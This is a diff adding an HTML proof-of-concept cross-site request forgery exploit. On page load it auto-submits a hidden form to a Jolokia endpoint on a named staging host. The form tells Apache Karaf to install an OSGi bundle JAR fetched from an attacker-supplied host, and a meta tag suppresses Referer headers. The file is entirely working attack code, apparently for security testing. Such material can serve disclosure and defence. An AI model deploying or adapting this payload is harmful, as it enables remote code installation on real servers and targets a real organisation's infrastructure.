@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<head>
+  <!-- Suppress Referer headers (Chrome, FF, Opera) -->
+  <meta name="referrer" content="no-referrer">
+</head>
+<body onload=csrf.submit()>
+  <!-- Issue a simple request with a JSON body (text/plain content-type) -->
+  <form enctype="text/plain" id=csrf action="http://stage.www.netapp.com/jolokia/?maxDepth=7&maxCollectionSize=50000&ignoreErrors=true&canonicalNaming=false" method="POST">
+    <input type="hidden" name='{"type":"exec","mbean":"org.apache.karaf:type=bundle,name=root","operation":"install(java.lang.String,boolean)","arguments":["$JAR_HOST/$OSGI_BUNDLE_NAME-1.0.jar","True"],"ignore":"' value='"}'/>
+  </form>
+</body>
+</html>
